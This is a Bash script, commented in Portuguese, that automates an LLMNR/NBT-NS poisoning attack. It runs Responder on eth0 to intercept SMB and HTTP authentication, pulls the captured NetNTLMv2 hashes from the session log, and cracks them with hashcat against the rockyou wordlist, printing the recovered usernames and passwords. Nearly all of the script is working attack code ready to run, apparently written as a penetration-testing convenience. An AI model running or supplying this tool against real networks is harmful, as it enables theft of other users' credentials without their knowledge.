#!/bin/bash

:<<'Explicação'
O script fará algumas validações básicas para execução, como a existência dos binários necessários, respectivamente Responder e Hashcat. Encontrará os arquivos de log onde ficam armazenadas as hashes, farão a limpa se for necessário - o quê é recomendado, pois, se executado muitas vezes, as hashs poderão duplicar e geraria muitas tentativas de quebra de hash ou até erro. Também verificará a configuração para interceptação do Responder. Por último, executará os binários com base em respostas do usuário.
Explicação


OFF='\033[0m'
Red='\033[0;31m'
Cyan='\033[0;36m'
lRed='\033[1;31m'
Green='\033[0;32m'
lGreen='\033[1;32m'
Yellow='\033[1;33m'

#Ação de encerramento
ctrl_c(){
	printf "\n${Yellow}[!] Sinal de encerramento detectado \"CTRL+C\", finalizando o script e encerrando todos os subprocessos...${OFF}\n"
	hashcat_pid=$(ps aux | grep -i hashcat | grep -ve "\--color=auto" | cut -d " " -f6)
		for i in ${hashcat_pid}; do kill ${i} &>/dev/null; done
	responder_pid=$(ps aux | grep -i Responder | grep -ve "\--color=auto" | cut -d " " -f6)
		for i in ${responder_pid}; do kill ${i} &>/dev/null; done
	exit 1
}
trap ctrl_c SIGINT

#Verificando ferramentas a serem utilizadas
for i in "hashcat" "responder"; do
	validate_tool=$(command -v ${i})
		if [[ ${?} != 0 ]]; then
				printf "${Red}[-] A ferramenta ${lRed}${i}${OFF} ${Red}está faltando no sistema.${OFF}\n"
				read -p "[*] Deseja instalar *${i}* agora? [Y/n]" tool_install
				if [[ ${tool_install} == "Y" || ${tool_install} == "y" || ${tool_install} == "" ]]; then
					apt install ${i}
					if [[ $? != 0 ]]; then
						printf "${lRed}[-] Algo deu errado na instalação do ${lGreen}${i}${OFF}${lRed}, tente com outro instalador de pacotes.${OFF}"
					exit
					fi
				elif [[ ${tool_install} == "N" || ${tool_install} == "n" ]]; then
					printf "${Yellow}[!] A ferramenta não será instalada, portanto o script encerrará.${OFF}"
					exit 0
				else
					printf "${Green} A ferramenta ${lGreen}${i}${OFF} ${Green}foi instalada com sucesso.${OFF}"
				fi
		else
			printf "${Green}[+] Ferramenta ${lGreen}${i}${OFF} ${Green}foi encontrada no sistema.${OFF}\n"
		fi
done

#Localizando arquivo de configuração do Responder e avaliando se os módulos necessários estão ativos
responder_conf=$(find / -type f -iname responder.conf -exec ls {} \; 2>/dev/null)
validate_conf=$(cat "${responder_conf}" | grep -iEe "SMB = On|HTTP = On" | wc -l)
	if [[ ${validate_conf} != 2 ]]; then
		printf "${Red}[-] Configurações inválidas em ${lRed}${responder_conf}${OFF}${Red}, favor ajustá-las${OFF}\n${Green}[!] *Server to start* devem estar com ${lGreen}SMB${OFF} ${Green}e ${lGreen}HTTP${OFF}${Green} = On${OFF}" 
		exit
	fi

#Definindo caminho dos logs no sistema
touch /tmp/hashes.txt
temp_hash_file=("/tmp/hashes.txt")
responder_path=$(find / -type f -iname Responder-Session.log -exec ls {} \; 2>/dev/null)
hashcat_path=$(find / -type f -iname hashcat.potfile -exec ls {} \; 2>/dev/null)

#Limpeza de logs e potfiles
read -p "[!] Você deseja limpar os registros de log destas ferramentas para evitar enganos de hash? [y/N]: " clear_log
	if [[ ${clear_log} == "Y" || ${clear_log} == "y" ]]; then
		echo -n > ${responder_path}
		echo -n > ${hashcat_path}
		echo -n > ${temp_hash_file}
	elif [[ ${clear_log} == "N" || ${clear_log} == "n" || ${clear_log} == "" ]]; then
		printf "${Red}[!] Os logs não foram limpos, ${lRed}eles podem se acumular${OFF}${Red}, siga por sua conta e risco${OFF}\n"
	else
		printf "${lRed}[X] Opção inválida: [Y/N] -- Nenhum log foi limpo.${OFF}\n"
	fi

#Modo de execução do responder
read -p "Você deseja executar o Responder agora? [y/N]: " responder_mode
	if [[ ${responder_mode} == "Y" || ${responder_mode} == "y" ]]; then
		ctrl_c2(){
			printf "${Yellow}[!] Terminando o processo Responder${OFF}\n"
		}
		trap ctrl_c2 SIGINT
		bash -c "responder -I eth0 -dwv"
	elif [[ ${responder_mode} == "N" || ${responder_mode} == "n" || ${responder_mode} = "" ]]; then
		printf "${lGreen}[*] Responder não será iniciado${OFF}\n"
	else
		printf "${lRed}[X] Opções inválidas [Y/N] -- Responder não será iniciado...${OFF}\n"
	fi

check_hash=$(cat ${responder_path} | grep "Hash" | cut -d ":" -f4- | tr -d " " | awk -F: '!seen[$1 FS $2]++' | wc -l)
	if [[ ${check_hash} -ge 1 ]]; then
		hashes_file=$(cat ${responder_path} | grep "Hash" | cut -d ":" -f4- | tr -d " " | awk -F: '!seen[$1 FS $2]++' >> ${temp_hash_file})
		printf "${Yellow}[+] Hashes encontradas em ${lGreen}${responder_path}${OFF}\n"
		read -p "Deseja realizar a quebra de hashes com o hashcat? [y/N]: " crack_hash
			if [[ ${crack_hash} == "Y" || ${crack_hash} == "y" ]]; then
				printf "${lGreen}[+] Iniciando o Hashcat${OFF}\n"
				hashcat -a0 -m5600 "${temp_hash_file}" "/usr/share/wordlists/rockyou.txt" -j 'c @ $1 $2 $3 $@'
				if [[ $(cat ${hashcat_path} | wc -l) -ge 1 ]]; then
					hash_output=$(cat ${hashcat_path} | awk -F: '{print $3"\\"$1 FS $NF}')
					for i in ${hash_output}; do
						printf "\n+--------------------------------------------------+\n"
                                                echo -e "${i}"
                                                printf "+--------------------------------------------------+"
                                        done
				fi
			elif [[ ${crack_hash} == "N" || ${crack_hash} == "n" || ${crack_hash} == "" ]]; then
				printf "[!] Nenhuma hash será quebrada. Mas podem ser encontradas em ${temp_hash_file}.\n"
			else
				printf "${lRed}[X] Opção inválida [Y/N] -- Terminando o script...${OFF}"
				exit 1
			fi
	else
		printf "${Red}[-] Não foram encontradas Hashes no arquivo ${lRed}${temp_hash_file}${lRed}${Red} -- Terminando o script...${OFF}"
	fi
			


#Garantia que os processos e subprocessos abertos pelo script foram fechados ao forçar o encerramento do mesmo
ctrl_c(){
          printf "\n${Yellow}Sinal de encerramento detectado \"CTRL+C\", finalizando o script e encerrando todos os subprocessos...${OFF}\n"
          hashcat_pid=$(ps aux | grep -i hashcat | grep -ve "\--color=auto" | cut -d " " -f6)
                  for i in ${hashcat_pid}; do kill $i; done
          responder_pid=$(ps aux | grep -i Responder | grep -ve "\--color=auto" | cut -d " " -f6)
                  for i in ${responder_pid}; do kill $i; done
          exit 1
          }
trap ctrl_c SIGINT

sleep 1
